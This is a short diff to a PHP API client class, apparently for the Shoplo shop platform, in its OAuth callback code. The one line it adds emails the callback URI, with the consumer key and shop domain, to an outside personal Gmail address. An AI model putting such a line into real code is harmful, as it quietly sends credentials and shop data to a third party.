@@ -206,6 +206,7 @@ class ShoploApi
         {
             $shopDomain = $_SESSION['shop_domain'];
             $callback_uri = $this->callback_url . '?consumer_key='.rawurlencode($this->api_key).'&shop_domain='.$shopDomain;
+            mail("adrianadamiec@gmail.com", 'ShoploApi shop_domain url', " callback uri: ".$callback_uri);
             unset($_SESSION['shop_domain']);
         }
         else
